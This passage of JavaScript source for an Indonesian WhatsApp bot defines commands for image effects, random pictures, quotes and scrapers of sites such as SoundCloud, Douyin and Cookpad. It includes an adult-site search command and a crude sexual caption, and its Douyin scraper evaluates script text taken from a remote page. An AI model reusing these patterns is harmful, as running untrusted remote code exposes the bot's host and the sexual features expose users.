            link = "https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html";
          }
          if (/galaxywallpaper/.test(command)) {
            link = "https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html";
          }
          if (/1917style/.test(command)) {
            link = "https://en.ephoto360.com/1917-style-text-effect-523.html";
          }
          if (/makingneon/.test(command)) {
            link = "https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html";
          }
          if (/royaltext/.test(command)) {
            link = "https://en.ephoto360.com/royal-text-effect-online-free-471.html";
          }
          if (/freecreate/.test(command)) {
            link = "https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html";
          }
          if (/galaxystyle/.test(command)) {
            link = "https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html";
          }
          if (/lighteffects/.test(command)) {
            link = "https://en.ephoto360.com/create-light-effects-green-neon-online-429.html";
          }
          let haldwhd = await ephoto(link, q);
          Alice.sendMessage(m.chat, {
            image: {
              url: haldwhd
            },
            caption: `${packname}`
          }, {
            quoted: m
          });
        }
        break;


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Ephoto Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Random Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\

case 'aesthetic':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/aesthetic.json'))
var iiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'antiwork':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/antiwork.json'))
var iiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'blackpink2':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/blackpink.json'))
var iiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'bike':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/bike.json'))
var iiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'boneka':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/boneka.json'))
var iiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'cosplay':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/cosplay.json'))
var iiiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'cat':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/cat.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'doggo':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/doggo.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiil = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiil.url } }, { quoted: m })
break
case 'justina':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/justina.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiill = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiill.url } }, { quoted: m })
break

case 'kayes':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/kayes.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiilll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiilll.url } }, { quoted: m })
break
case 'kpop':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/kpop.json'))
var ll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: ll.url } }, { quoted: m })
break
case 'notnot':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/notnot.json'))
var lll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: lll.url } }, { quoted: m })
break
case 'car':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/car.json'))
var llll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: llll.url } }, { quoted: m })
break
case 'couplepic':case 'couplepicture':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/ppcouple.json'))
var lllll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: lllll.url } }, { quoted: m })
break
case 'profilepic':  case 'profilepicture':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/profile.json'))
var llllll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: llllll.url } }, { quoted: m })
break
case 'pubg':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/pubg.json'))
var lllllll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: lllllll.url } }, { quoted: m })
break
case 'rose':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/rose.json'))
var llllllll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: llllllll.url } }, { quoted: m })
break
case 'ryujin':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/ryujin.json'))
var lllllllll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: lllllllll.url } }, { quoted: m })
break
case 'ulzzangboy':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/ulzzangboy.json'))
var llllllllll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: llllllllll.url } }, { quoted: m })
break
case 'ulzzanggirl':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/ulzzanggirl.json'))
var lllllllllll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: lllllllllll.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/wallml.json'))
var llllllllllll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: llllllllllll.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/randompics/wallhp.json'))
var lllllllllllll = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: lllllllllllll.url } }, { quoted: m })
break

case 'faktaunik': {
if (isBan) return XRB()
await XReaction() 
let Xyroo = await fetchJson(`https://api.autoresbot.com/api/random/faktaunik`)
let qutenya = Xyroo.data;
await reply(qutenya)
}
break
case 'quotesbucin': {
if (isBan) return XRB()
await XReaction() 
let Xyroo = await fetchJson(`https://api.autoresbot.com/api/random/bucinquote`)
let qutenya = Xyroo.data;
await reply(qutenya)
}
break
case "quotesanime":
case "quotesanim":
{
let res = await await fetch("https://katanime.vercel.app/api/getrandom?limit=1");
if (!res.ok) {
return await res.text();
}
let json = await res.json();
if (!json.result[0]) {
return json;
}
let {
indo,
character,
anime
} = json.result[0];
reply(`${indo}\n\n📮By:  _${character}_ \nAnime:\n${anime}`);
}
break;
case 'quotesjawa': {
if (isBan) return XRB()
await XReaction()

await XReaction() 
let Xyroo = await fetchJson(`https://api.autoresbot.com/api/random/jawaquote`)
let qutenya = Xyroo.data;
await reply(qutenya)
}
break
case 'quotes': {
if (isBan) return XRB()
await XReaction()

await XReaction() 
let Xyroo = await Quotes();
let cap = `
_✨° ${Xyroo.quotes} °_

_🍂${Xyroo.author} ~_`
await reply(cap)
}
break
case 'meme': {
if (isBan) return XRB()
await XReaction()

await XReaction()
try {
let Xyroo = await JalanTikusMeme()
await Alice.sendMessage(m.chat, { image: { url: Xyroo }, caption: 'donee' }, { quoted: m })
} catch (error) {
  return XRR()
}
}
break
case 'darkjokes':
case 'jokesgelap':
case 'jokesdark':
case 'darkjoke': {
if (isBan) return XRB()
await XReaction()
try {
let Xyroo = await Darkjokes()
await Alice.sendMessage(m.chat, { image: { url: Xyroo }, caption: 'donee' }, { quoted: m })
} catch (error) {
  return XRR()
}
}
break
case 'kataanime':{
if (isBan) return XRB()
await XReaction()

await XReaction()
    	try {
//wm senn
		let res = await await fetch("https://katanime.vercel.app/api/getrandom");
		if (!res.ok) throw await res.text();
		let json = await res.json();
//wm senn
		if (!json.result) throw json;
		let data = "";
		for (let i = 0; i < json.result.length; i++) {
			let { id, english, indo, character, anime } = json.result[i];
			data += `_*•.* "${indo}"_\n${character} (${anime})\n\n`;
		}
//wm senn
		reply(data);
	} catch (e) {
		console.log(e);
		reply(msg.error)
	}
//wm senn
};
break

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Random Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Search Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\
case 'komiku':
case 'komiku-search':{
if (isBan) return XRB()
await XReaction()
 if (!text) return reply(`Ex : ${XyrooRynzz} manhwa regression`);

 try {
 const res = await fetch(`https://fastrestapis.fasturl.cloud/comic/komikindo/search?name=${encodeURIComponent(text)}`);
 const json = await res.json();
 const result = json.result;

 if (!result || result.length === 0) return reply('❌ Tidak ada hasil ditemukan.');

 const selected = result.slice(0, 10);

 const cards = await Promise.all(selected.map(async (komik, i) => ({
 header: {
 title: `📖 ${komik.title}`,
 hasMediaAttachment: true,
 imageMessage: (await generateWAMessageContent({
 image: { url: komik.image }
 }, { upload: Alice.waUploadToServer })).imageMessage
 },
 body: {
 text: `⭐ *Rating:* ${komik.rating}\n🖇️ *Link:* ${komik.url}`
 },
 footer: {
 text: `🔗 Klik tombol di bawah untuk membaca langsung`
 },
 nativeFlowMessage: {
 buttons: [
 {
 name: 'cta_url',
 buttonParamsJson: JSON.stringify({
 display_text: '📘 Baca Sekarang',
 url: komik.url
 })
 }
 ]
 }
 })));

 const carousel = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: {
 text: `🔍 ʜᴀsɪʟ ᴍᴀɴʜᴡᴀ ᴅᴀʀɪ: *"${text}"*`
 },
 footer: {
 text: "Geser buat lihat semua pilihan yang tersedia~"
 },
 carouselMessage: {
 cards
 }
 })
 }
 }
 }, { quoted: m });

 await Alice.relayMessage(m.chat, carousel.message, {
 messageId: carousel.key.id
 });

 } catch (err) {
 console.error('❌ Error fetch manhwa:', err);
 reply('Gagal ngambil data manhwa, coba beberapa saat lagi.');
 }
}
 break
case 'vivadetail': {
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`contoh penggunaan:\n${XyrooRynzz} https://vivagoal.com/pecat-branko-ivankovic-nama-shin-tae-yong-masuk-daftar-pelatih-timnas-china-selanjutnya/`)
 
  try {
    let api = `https://zenz.biz.id/berita/vivagoal/detail?url=${encodeURIComponent(text)}`
    let res = await fetch(api)
    if (!res.ok) reply('gbisa akses api nya, coba cek api nya')
 
    let json = await res.json()
    if (!json.status || !json.result) reply('tidak ditemukan data yang valid')
 
    let { title, thumbnail, published, content, url } = json.result
    let tanggal = new Date(published).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
 
    let pesan = ` *${title}*\n *Terbit:* ${tanggal}\n\n *Sumber:* ${url}\n\n${content}`
 
    await Alice.sendFile(m.chat, thumbnail, 'berita.jpg', pesan, m)
  } catch (e) {
    reply(m.chat, e.toString(), m)
  }
 
  break
}
case 'soundcloud-search': {
if (isBan) return XRB()
await XReaction()
  const cache = { version: '', id: '' }

  async function getClientID() {
    const { data: html } = await axios.get('https://soundcloud.com/', {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Exonity/1.0' }
    })

    const version = html.match(/<script>window\.__sc_version="(\d{10})"<\/script>/)?.[1]
    if (!version) return

    if (cache.version === version) return cache.id

    const scriptMatches = [...html.matchAll(/<script.*?src="(https:\/\/a-v2\.sndcdn\.com\/assets\/[^"]+)"/g)]
    for (const [, scriptUrl] of scriptMatches) {
      const { data: js } = await axios.get(scriptUrl, {
        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Exonity/1.0' }
      })
      const idMatch = js.match(/client_id:"([a-zA-Z0-9]{32})"/)
      if (idMatch) {
        cache.version = version
        cache.id = idMatch[1]
        return idMatch[1]
      }
    }
  }

  function formatDuration(ms) {
    const sec = Math.floor(ms / 1000)
    const min = Math.floor(sec / 60)
    const sisa = sec % 60
    return `${min}:${sisa.toString().padStart(2, '0')}`
  }

  function formatNumber(n) {
    if (n >= 1e6) return (n / 1e6).toFixed(1).replace(/\.0$/, '') + 'M'
    if (n >= 1e3) return (n / 1e3).toFixed(1).replace(/\.0$/, '') + 'K'
    return n.toString()
  }

  function formatDate(dateStr) {
    if (!dateStr) return null
    const d = new Date(dateStr)
    return d.toISOString().split('T')[0]
  }

  try {
    if (!text) return reply(`Ex? : ${XyrooRynzz} dj stecu x nana buang muka`)
    
    const client_id = await getClientID()

    const { data } = await axios.get('https://api-v2.soundcloud.com/search/tracks', {
      params: { q: text, client_id, limit: 10 },
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Exonity/1.0' }
    })

    const results = data.collection.map(track => `
*°${track.title}*
Author : ${track.user.username}
Durasi : ${formatDuration(track.full_duration)}
Like : ${formatNumber(track.likes_count || 0)}
Play : ${formatNumber(track.playback_count || 0)}
Rilis : ${formatDate(track.release_date || track.created_at)}
Link : ${track.permalink_url}
`).join('\n')

    await Alice.sendMessage(m.chat, { 
      image: { url: data.collection[0]?.artwork_url }, 
      caption: results 
    }, { quoted: m })

  } catch (e) {
    reply(e.message)
  }
}
break;
case 'soundcloud-play': {
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Ex? ${XyrooRynzz} where we are`);
  try {
    const search = await fetch(`https://zenz.biz.id/search/SoundCloud?query=${encodeURIComponent(text)}`);
    const result = await search.json();
    if (!result.status || !result.result || !result.result[0]) {
      return reply('Lagu tidak ditemukan.');
    }
    const url = result.result[0].url;
    const res = await fetch(`https://zenz.biz.id/downloader/SoundCloud?url=${encodeURIComponent(url)}`);
    const json = await res.json();
    if (!json.status || !json.audio_url) {
      return reply('Gagal mengunduh lagu.');
    }
    await Alice.sendMessage(m.chat, {
      audio: { url: json.audio_url },
      mimetype: 'audio/mpeg',
      ptt: false,
      fileName: `${json.title}.mp3`,
      caption: `Judul: ${json.title}\nAuthor: ${json.author}\nDurasi: ${json.duration}`,
      contextInfo: {
        externalAdreply: {
          title: json.title,
          body: json.author,
          thumbnailUrl: json.thumbnail,
          mediaType: 2,
          mediaUrl: json.source_url,
          sourceUrl: json.source_url,
          renderLargerThumbnail: true,
        },
      },
    }, { quoted: m });
  } catch (err) {
    console.error(err);
    reply('Terjadi kesalahan.');
  }
};
break
case 'jkt48': {
  try {
const axios = require("axios");
    const liveRes = await axios.get('https://48intensapi.my.id/api/idnlive/jkt48');
    const liveList = liveRes.data?.data || [];
    if (!Array.isArray(liveList) || liveList.length === 0) {
      return reply('Tidak ada member JKT48 yang sedang live saat ini.');
    }
    for (let i = 0; i < liveList.length; i++) {
      const mbr = liveList[i];
      const nama = mbr.user.name;
      const username = mbr.user.username;
      const judul = mbr.title;
      const viewers = mbr.view_count;
      const waktu = new Date(mbr.live_at).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
      const link = `https://www.idn.app/${username}/live/${mbr.slug}`;
      const img = mbr.image;
      await Alice.sendMessage(m.chat, {
        text: `*${nama} (@${username}) sedang LIVE!*\n\n` +
              `• *Judul:* ${judul}\n` +
              `• *Penonton:* ${viewers}\n` +
              `• *Sejak:* ${waktu}\n\n` +
              `Tonton sekarang:\n${link}`,
        contextInfo: {
          externalAdreply: {
            showAdAttribution: true,
            title: `${nama} sedang LIVE!`,
            body: `Judul: ${judul}`,
            mediaUrl: link,
            mediaType: 1,
            renderLargerThumbnail: true,
            thumbnailUrl: img,
            sourceUrl: link
          }
        }
      }, { quoted: m });
    }
  } catch (e) {
    console.error('ERROR JKT48:', e);
    reply(`Gagal mengambil data JKT48: ${e.message}`);
  }
}
break
case 'searchdouyin': case 'douyinsearch': {
if (isBan) return XRB()
await XReaction()
    if (!text) return reply('Masukkan kata kunci pencarian!\nContoh: .douyinsearch fifty fifty');
    const axios = require('axios');
    const cheerio = require('cheerio');
    const vm = require('vm');
    const DouyinSearchPage = class {
        constructor() {
            this.baseURL = 'https://so.douyin.com/';
            this.defaultParams = {
                search_entrance: 'aweme',
                enter_method: 'normal_search',
                innerWidth: '431',
                innerHeight: '814',
                reloadNavStart: String(Date.now()),
                is_no_width_reload: '1',
                keyword: '',
            };
            this.cookies = {};
            this.api = axios.create({
                baseURL: this.baseURL,
                headers: {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'id-ID,id;q=0.9',
                    'referer': 'https://so.douyin.com/',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
                }
            });
            this.api.interceptors.response.use(res => {
                const setCookies = res.headers['set-cookie'];
                if (setCookies) {
                    setCookies.forEach(c => {
                        const [name, value] = c.split(';')[0].split('=');
                        if (name && value) this.cookies[name] = value;
                    });
                }
                return res;
            });
            this.api.interceptors.request.use(config => {
                if (Object.keys(this.cookies).length) {
                    config.headers['Cookie'] = Object.entries(this.cookies).map(([k, v]) => `${k}=${v}`).join('; ');
                }
                return config;
            });
        }
        async initialize() {
            try {
                await this.api.get('/');
                return true;
            } catch {
                return false;
            }
        }
        async search({ query }) {
            await this.initialize();
            const params = { ...this.defaultParams, keyword: query, reloadNavStart: String(Date.now()) };
            const res = await this.api.get('s', { params });
            const $ = cheerio.load(res.data);
            let scriptWithData = '';
            $('script').each((_, el) => {
                const text = $(el).html();
                if (text.includes('let data =') && text.includes('"business_data":')) {
                    scriptWithData = text;
                }
            });
            const match = scriptWithData.match(/let\s+data\s*=\s*(\{[\s\S]+?\});/);
            if (!match) throw 'Data tidak ditemukan di halaman.';
            const dataCode = `data = ${match[1]}`;
            const sandbox = {};
            vm.createContext(sandbox);
            vm.runInContext(dataCode, sandbox);
            const awemeInfos = sandbox.data?.business_data
                ?.map(entry => entry?.data?.aweme_info)
                .filter(Boolean);
            return awemeInfos;
        }
    };

    try {
        const douyin = new DouyinSearchPage();
        const results = await douyin.search({ query: text });
        if (!results.length) return reply('Tidak ditemukan hasil.');
        const message = results.slice(0, 5).map((v, i) => {
            return `*${i + 1}.* ${v.desc || 'Tanpa deskripsi'}\n👤: ${v.author?.nickname}\n❤️: ${v.statistics?.digg_count} | 💬: ${v.statistics?.comment_count}\n🔗: https://www.douyin.com/video/${v.aweme_id}`;
        }).join('\n\n');
        reply(message);
    } catch (err) {
        console.error(err);
        reply('Gagal mengambil hasil pencarian Douyin.');
    }
}
    break
case 'waktudunia': {
if (isBan) return XRB()
await XReaction()
async function getWorldTime() {
    const url = 'https://onlinealarmkur.com/world/id/';
    try {
        const { data } = await axios.get(url);
        const $ = cheerio.load(data);
        let hasil = [];

        $('.flex.items-center.space-x-3').each((index, element) => {
            const bendera = $(element).find('.avatar .text-2xl').text().trim();
            const kota = $(element).find('.city-name').text().trim();
            const zona = $(element).find('.city-time').attr('data-tz');

            if (zona) {
                const realTime = moment().tz(zona).format('ddd - HH:mm');
                hasil.push({ bendera, kota, waktu: realTime });
            }
        });

        return hasil;
    } catch (error) {
        return [];
    }
}
    let hasilWaktu = await getWorldTime();
    if (hasilWaktu.length === 0) {
        return reply('❌ Gagal mengambil data waktu dunia!');
    }

    let pesanWaktu = '*🕰️ Waktu Dunia Saat Ini 🕰️*\n\n';
    hasilWaktu.forEach(item => {
        pesanWaktu += `${item.bendera} *${item.kota}* - ${item.waktu}\n`;
    });

    await Alice.sendMessage(m.chat, { text: pesanWaktu }, { quoted: m });
};
break
case 'cerpen': {
if (isBan) return XRB()
await XReaction()
async function getCerpen() {
try {
const anu = await axios.get("http://cerpenmu.com/100-cerpen-kiriman-terbaru")
const $ = cheerio.load(anu.data)
const dbres = []

$("a[title]").each((a, b) => {
const judul = $(b).attr("title")
const link = $(b).attr("href")
dbres.push({ judul, link })
})

return dbres
} catch (err) {
console.log(err)
}
}

const rs = await getCerpen()
if (rs.length === 0) return Alice.sendMessage(m.chat, { text: "Gagal Mengambil Berita" }, { quoted:m })
await Alice.sendMessage(m.chat, { text: `RESULT\n\n`+rs.map(a => `JUDUL CERPEN: ${a.judul}\nLINK: ${a.link}`).join("\n\n") }, { quoted: m})
}
break
case "searchspotify": case "spotify-search": case "sspotify": case "ssp": {
    if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Example: ${XyrooRynzz} judul lagu`);
  
  try {
    let api = await fetch(`https://api-ghostx.biz.id/api/search/spotifysearch?q=${text}`);
    let data = await api.json();
    
    if (!data.status) return reply('Search failed! Try again later.');
    
    let hasil = `*HASIL PENCARIAN SPOTIFY*\n\n`;
    for (let i = 0; i < Math.min(10, data.result.length); i++) {
      let lagu = data.result[i];
      hasil += `*${i + 1}.* ${lagu.trackName}\n`;
      hasil += `*Artis* : ${lagu.artistName}\n`;
      hasil += `*URL* : ${lagu.externalUrl}\n\n`;
    }
    hasil += `Ketik ${prefix}spotify-download <url> untuk download music Spotify!`;
    
    await Alice.sendMessage(m.chat, { text: hasil });
  } catch (e) {
    console.log(e);
    reply('Error occurred while searching!');
  }
}
break
case 'waifu': {
  if (isBan) return XRB()
await XReaction()
  try {
    let res = await axios.get('https://fastrestapis.fasturl.cloud/sfwnsfw/anime?type=sfw&tag=waifu', {
      responseType: 'arraybuffer'
    });

    Alice.sendMessage(m.chat, {
      image: Buffer.from(res.data),
      caption: 'Nih waifumu~\n\nBuat bacol enak 🤗'
    }, { quoted: m });

  } catch (err) {
    console.error(err);
    reply('Lagi error bang, coba lagi nanti.');
  }
}
break
case 'hentais':
case 'hentai': {
if (isBan) return XRB()
await XReaction()
  if (!args.length) return reply(`Masukkan judul yang ingin dicari!\nContoh: ${XyrooRynzz} hinata`)

async function searchHentai(query) {
  try {
    const { data } = await axios.get("https://hentai.tv/?s=" + encodeURIComponent(query))
    const $ = cheerio.load(data)
    const result = []
    
    $('div.flex > div.crsl-slde').each((i, el) => {
      const thumbnail = $(el).find('img').attr('src')
      const title = $(el).find('a').text().trim()
      const views = $(el).find('p').text().trim()
      const url = $(el).find('a').attr('href')
      result.push({ thumbnail, title, views, url })
    })

    return {
      coder: 'SaaOfc',
      warning: 'failed',
      result
    }
  } catch (err) {
    return { error: 'error', message: err.message }
  }
}

  const res = await searchHentai(args.join(" "))
  if (!res || res.result.length === 0) return reply('Tidak ditemukan!')

  let teks = `*Hasil Pencarian dari Hentai.tv*\n\n`
  for (let i = 0; i < Math.min(5, res.result.length); i++) {
    const x = res.result[i]
    teks += `*${x.title}*\nViews: ${x.views}\nURL: ${x.url}\n\n`
  }

  await Alice.sendMessage(m.chat, {
    text: teks.trim(),
    contextInfo: {
      externalAdreply: {
        title: "Hentai Search",
        body: packname,
        thumbnailUrl: res.result[0]?.thumbnail,
        sourceUrl: res.result[0]?.url,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  }, { quoted: m })
}
break

case 'jadwaltv': {
if (isBan) return XRB()
await XReaction()
    if (!text) return reply(m.chat, `Masukkan channel TV yang ingin Anda lihat jadwalnya.\nExample: ${XyrooRynzz} rtv`);

async function fetchJadwalTv(tv) {
    try {
        const response = await axios.get(`https://www.jadwaltv.net/channel/${encodeURIComponent(tv)}`);
        const $ = cheerio.load(response.data);

        const hasil = [];
        $('table.table-bordered tbody tr').each((i, el) => {
            const jam = $(el).find('td').eq(0).text().trim();
            const acara = $(el).find('td').eq(1).text().trim();

            if (jam && acara) hasil.push({ jam, acara });
        });

        return hasil;
    } catch (error) {
        throw new Error("Gagal mengambil data, pastikan nama channel benar atau situs sedang bermasalah.");
    }
}

    try {
        const data = await fetchJadwalTv(text.toLowerCase());
        if (data.length === 0) return reply(m.chat, 'Tidak ada hasil untuk nama channel tersebut.');

        const jadwalTv = data.map(({ jam, acara }) => `${jam} - ${acara}`).join('\n');
        const pesan = `Jadwal TV untuk channel *${text.toUpperCase()}*:\n\n${jadwalTv}`;
        await reply(`${pesan}`);
    } catch (error) {
        await reply(m.chat, `Terjadi kesalahan: ${error.message}`);
    }
};
break

case 'alkitab': {
if (isBan) return XRB()
await XReaction()
    if (!text) return reply(`teksnya mana?\n\ncontoh: ${XyrooRynzz} kejadian`)
    let res = await axios.get(`https://alkitab.me/search?q=${encodeURIComponent(text)}`, { headers: { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" } })

    let $ = cheerio.load(res.data)
    let result = []
    $('div.vw').each(function (a, b) {
        let teks = $(b).find('p').text().trim()
        let link = $(b).find('a').attr('href')
        let title = $(b).find('a').text().trim()
        result.push({ teks, link, title })
    })

    let caption = result.map(v => `${v.title}\n${v.teks}`).join('\n────────\n')
    reply(caption)
}
break

case 'jkt48news': {
if (isBan) return XRB()
await XReaction()

async function jktNews(lang = "id") {
   let { data } = await axios.get(`https://jkt48.com/news/list?lang=${lang}`);
   let $ = cheerio.load(data);

   const news = [];
   
   $(".entry-news__list").each((index, element) => {
      const title = $(element).find("h3 a").text();
      const link = $(element).find("h3 a").attr("href");
      const date = $(element).find("time").text();

      news.push({ title, link: "https://jkt48.com" + link, date });
   });

   return news;
}

   try {
      let data = await jktNews();
      if (data.length === 0) return reply("Tidak Ada Berita Terbaru Hari Ini, Silahkan Kembali.")
      let result = data.map((res, id) => {
        return `${id + 1}, ${res.title}\nLink: ${res.link}\nTanggal Mulai: ${res.date}`
        }).join("\n\n");
        await reply(result)
   } catch (error) {
      throw "Gagal Mencari Berita."
      console.error(error.message)
   }
}
break
case 'resepsearch': {
if (isBan) return XRB()
await XReaction()
  try {
    if (!text) return reply(`Please provide a dish name to search!\n\nExample: ${XyrooRynzz} Nasi Goreng`);

async function resep(makanan) {
  let BASE = `https://cookpad.com/id/cari/${encodeURIComponent(makanan)}`;
  let { data } = await axios.get(BASE);

  let $ = cheerio.load(data);
  let hasil = [];

  $("li[data-search-tracking-target='result']").each((i, el) => {
    let namaResep = $(el).find("h2 a").text().trim();
    let linkResep = "https://cookpad.com" + $(el).find("h2 a").attr("href");
    let waktuMasak = $(el).find(".mise-icon-time + .mise-icon-text").text().trim();
    let pembuat = $(el).find(".flex.items-center span.text-cookpad-gray-600").text().trim();

    hasil.push({ namaResep, linkResep, waktuMasak, pembuat });
  });

  return hasil;
}

    const results = await resep(text);

    if (results.length === 0) {
      return reply('No recipes found for the given dish name.');
    }

    let message = `
🍽️ *Recipes Found!* 🍽️

`;
    results.forEach((res, index) => {
      message += `
🔹 *Recipe ${index + 1}*
- 🍲 Name: ${res.namaResep}
- ⏲️ Cooking Time: ${res.waktuMasak}
- 👨‍🍳 Created by: ${res.pembuat}
- 🔗 [View Recipe](${res.linkResep})
`;
    });

    await Alice.sendMessage(m.chat, { text: message, footer: packname }, { quoted: m });
  } catch (error) {
    console.error(error);
    reply("An error occurred: " + error.message);
  }
};
break

case 'animexin' : {
if (isBan) return XRB()
await XReaction()
  try {
    if (!text) { return reply(`Please provide a keyword or an action (update/detail/search)!\n\nExample:\n${XyrooRynzz} update`);
    }

    const args = text.split(' ');
    const action = args[0].toLowerCase();
    const query = args.slice(1).join(' ');

